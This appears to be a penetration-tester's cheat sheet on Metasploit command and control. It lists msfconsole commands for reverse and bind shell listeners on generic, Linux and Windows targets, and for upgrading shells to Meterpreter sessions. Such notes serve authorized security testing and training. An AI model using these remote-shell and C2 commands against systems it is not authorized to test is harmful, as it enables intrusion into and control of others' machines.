# Metasploit

Search Tag(s): #metasploit-framework #command-and-control #living-off-the-land

Note: You can use regular one-liners or create your own custom regular implants. Metasploit acts like a botnet so use it more often. Further more, you can use the [[05 - Command and Control/Metasploit/Interactive Shell/Meta Shell/Usage|meta shell's]] `resource` to automate commands in a faster pace. Look more in [[Resource|here]].

## 01 - Multi Handler

### 1.1 - Setting up a Generic TCP listener

#### 1.1.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload generic/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

#### 1.1.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload generic/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.2 - Setting up a Linux TCP listener

#### 1.2.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

#### 1.2.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload linux/x64/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.3 - Setting up a Windows TCP listener

#### 1.3.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

#### 1.3.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/x64/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

## 02 - Upgrade to Meterpreter Session

Another benefit is by converting regular shells to meterpreter whenever in various circumstances that you might need it.

```
msf > use post/multi/manage/shell_to_meterpreter

options

set session <session_ID>

set technique <powershell | vbs>

set payload_override windows/meterpreter/reverse_tcp

set platform_override windows

set psh_arch_override x64

run
```

Here's a shorter command.

```
msf > sessions -u <session_ID>
```

---
## References

- [Rapid7: Metasploit Framework - Upgrading shells to Metepreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

- [Hacking Articles: How to Upgrade Command Shell to Meterpreter](https://www.hackingarticles.in/command-shell-to-meterpreter/)